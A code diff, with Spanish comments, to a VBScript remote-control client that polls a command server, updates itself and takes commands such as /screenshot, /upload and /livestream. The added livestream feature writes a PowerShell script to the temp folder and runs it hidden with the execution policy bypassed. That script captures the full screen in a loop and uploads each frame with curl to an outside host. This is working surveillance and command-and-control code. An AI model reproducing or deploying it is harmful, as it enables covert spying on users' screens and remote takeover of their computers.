@@ -8,7 +8,7 @@ Dim WshShell, WshNetwork, FSO
 Dim logFilePath 
 
 ' --- AUTO UPDATE LOGIC ---
-Dim CURRENT_VERSION : CURRENT_VERSION = "v1.4"
+Dim CURRENT_VERSION : CURRENT_VERSION = "v1.6"
 Dim VERSION_URL : VERSION_URL = "https://logise1.github.io/cmd/version.txt"
 Dim UPDATE_URL : UPDATE_URL = "https://logise1.github.io/cmd/client10.vbs"
 
@@ -72,6 +72,9 @@ End If
 
 Dim lastCommandId
 lastCommandId = ""
+
+Dim isLivestreamActive : isLivestreamActive = False
+Dim lastLivestreamSync : lastLivestreamSync = 0
 
 ' --- Ejecución Principal ---
 LogWrite "Chequeando actualizaciones..."
@@ -193,7 +196,14 @@ End Sub
 Sub MainLoop()
     Do
         On Error Resume Next
-        ' LogWrite "Poll..."
+        If isLivestreamActive Then
+            If DateDiff("s", lastLivestreamSync, Now()) > 30 Then
+                StopLivestreamAsync
+                isLivestreamActive = False
+                LogWrite "Timeout: Livestream detenido por inactividad"
+            End If
+        End If
+
         WScript.Sleep POLL_MS
         UpdateHeartbeat GetEpochTime()
         CheckCommand
@@ -474,9 +484,39 @@ Sub CheckCommand()
         LogWrite "CheckCommand: Ejecutando /screenshot (simple)"
         DoScreenshot cmdId, cwdText
 
-    ElseIf trimmedCmdLower = "/livestream" Then
-        LogWrite "CheckCommand: INICIANDO MODO LIVESTREAM OPTIMIZADO"
-        RunLivestream cmdId, cwdText
+    ElseIf Left(trimmedCmdLower, 11) = "/livestream" Then
+        LogWrite "CheckCommand: INICIANDO MODO LIVESTREAM ASYNC"
+        Dim streamDelay : streamDelay = 500
+        Dim posSpaceLivestream
+        posSpaceLivestream = InStr(trimmedCmdLower, " ")
+        If posSpaceLivestream > 0 Then
+            On Error Resume Next
+            streamDelay = CLng(Mid(trimmedCmdLower, posSpaceLivestream + 1))
+            If Err.Number <> 0 Then streamDelay = 500
+            On Error GoTo 0
+            If streamDelay < 100 Then streamDelay = 500
+        End If
+
+        lastLivestreamSync = Now()
+        If Not isLivestreamActive Then
+            StartLivestreamAsync EncodeJsonKey(host), streamDelay
+            isLivestreamActive = True
+            WriteResponse cmdId, "LIVESTREAM BACKGROUND ACTIVADO (Delay: " & streamDelay & "ms)"
+        Else
+            WriteResponse cmdId, "LIVESTREAM RENOVADO"
+        End If
+
+    ElseIf trimmedCmdLower = "/stoplivestream" Then
+        LogWrite "CheckCommand: DETENIENDO LIVESTREAM ASYNC"
+        StopLivestreamAsync
+        isLivestreamActive = False
+        WriteResponse cmdId, "LIVESTREAM DETENIDO"
+
+    ElseIf Left(trimmedCmdLower, 10) = "/pollrate " Then
+        Dim newPollRate : newPollRate = CLng(Mid(trimmedCmdLower, 11))
+        If newPollRate < 100 Then newPollRate = 100
+        POLL_MS = newPollRate
+        WriteResponse cmdId, "INTERVALO DE COMANDOS AJUSTADO A " & POLL_MS & "ms"
 
     ElseIf Left(trimmedCmdLower, 7) = "/upload" AND InStr(trimmedCmdLower, " > ") > 0 Then
         ' ... (Código de Upload igual que antes) ...
@@ -541,58 +581,56 @@ Sub CheckCommand()
     On Error GoTo 0
 End Sub
 
-' --- NUEVO: Manejador del Livestream (Modo Simple Solicitado) ---
-Sub RunLivestream(initialCmdId, cwd)
+' --- NUEVO: Manejador del Livestream ASÍNCRONO ---
+Sub StartLivestreamAsync(hostId, delayMs)
+    StopLivestreamAsync ' Asegurar que no hay duplicados
+    Dim localFSO, shell
+    Set localFSO = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+    
+    Dim tempName : tempName = localFSO.GetTempName()
+    Dim psFile : psFile = localFSO.BuildPath(shell.ExpandEnvironmentStrings("%TEMP%"), "stream_" & tempName & ".ps1")
+    Dim fbUrl : fbUrl = BASE_URL & "/machines/" & hostId & "/screenshot.json"
+    
+    Dim scriptCode
+    scriptCode = "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; " & _
+                 "$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; " & _
+                 "while($true) { " & _
+                 "  try { " & _
+                 "    $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; " & _
+                 "    $gfx = [System.Drawing.Graphics]::FromImage($bmp); " & _
+                 "    $gfx.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size); " & _
+                 "    $tmp = [System.IO.Path]::GetTempFileName() + '.jpg'; " & _
+                 "    $bmp.Save($tmp, [System.Drawing.Imaging.ImageFormat]::Jpeg); " & _
+                 "    $bmp.Dispose(); $gfx.Dispose(); " & _
+                 "    $res = curl.exe -s -X POST https://greenbase.arielcapdevila.com/upload -F ""file=@$tmp""; " & _
+                 "    Remove-Item -Force $tmp -ErrorAction SilentlyContinue; " & _
+                 "    if($res -match '""id"":\s*""([^""]+)""') { " & _
+                 "        $id = $matches[1]; " & _
+                 "        $ts = [Math]::Floor([decimal](Get-Date (Get-Date).ToUniversalTime() -UFormat '%s')); " & _
+                 "        $json = '{""id"":""live_""+$ts,""data"":""gb:'+ $id +'"",""timestamp"":'+$ts+'}'; " & _
+                 "        curl.exe -s -X PUT -H ""Content-Type: application/json"" -d $json """ & fbUrl & """; " & _
+                 "    } " & _
+                 "  } catch {} " & _
+                 "  Start-Sleep -Milliseconds " & delayMs & "; " & _
+                 "}"
+    
+    Dim f : Set f = localFSO.OpenTextFile(psFile, 2, True)
+    f.Write scriptCode
+    f.Close
+    
+    ' Ejecutar escondido independientemente
+    shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psFile & """", 0, False
+End Sub
+
+Sub StopLivestreamAsync()
     On Error Resume Next
-    Dim expiryTime, currentCmdId, loopCmdId, loopResp
-    Dim b64, frameCounter
-    
-    currentCmdId = initialCmdId
-    WriteResponse currentCmdId, "INICIANDO LIVESTREAM (Captura Simple - 20s Timeout)"
-    
-    ' Definir tiempo de fin (20 segundos)
-    expiryTime = DateAdd("s", 20, Now())
-    frameCounter = 0
-    
-    Do While Now() < expiryTime
-        ' 1. Capturar (Directo VBS -> PS -> File)
-        b64 = CaptureScreenshotBase64(cwd)
-        
-        ' 2. Enviar si es válido
-        If Left(b64, 5) <> "ERROR" And Len(b64) > 100 Then
-            frameCounter = frameCounter + 1
-            WriteScreenshotToFirebase currentCmdId & "_f" & frameCounter, b64
-        End If
-        
-        ' 3. Esperar 0.5s
-        WScript.Sleep 10
-        
-        ' 4. Chequear comandos para Renovación o Interrupción
-        loopResp = httpGet(BASE_URL & "/machines/" & EncodeJsonKey(host) & "/command.json")
-        If Trim(loopResp) <> "null" And Len(Trim(loopResp)) > 0 Then
-            loopCmdId = JsonGetField(loopResp, "id")
-            
-            If loopCmdId <> "" And loopCmdId <> currentCmdId Then
-                If InStr(LCase(loopResp), """cmd"":""/livestream""") > 0 Then
-                    ' RENEWAL
-                    LogWrite "Livestream: Renovado por " & loopCmdId
-                    expiryTime = DateAdd("s", 20, Now())
-                    currentCmdId = loopCmdId
-                    lastCommandId = loopCmdId ' Actualizar global para que MainLoop no lo repita
-                    frameCounter = 0
-                    WriteResponse currentCmdId, "Livestream RENOVADO."
-                Else
-                    ' Otro comando -> Salir para que MainLoop lo procese
-                    LogWrite "Livestream: Interrumpido por otro comando."
-                    Exit Do
-                End If
-            End If
-        End If
-        
-        On Error Resume Next
-    Loop
-    
-    WriteResponse currentCmdId, "Livestream FINALIZADO (Timeout)."
+    Dim wmi, col, obj
+    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
+    Set col = wmi.ExecQuery("Select * from Win32_Process Where Name = 'powershell.exe' And CommandLine Like '%stream_%'")
+    For Each obj in col
+        obj.Terminate()
+    Next
 End Sub
 
 ' Function Helper para capturar un screenshot limpio en Base64
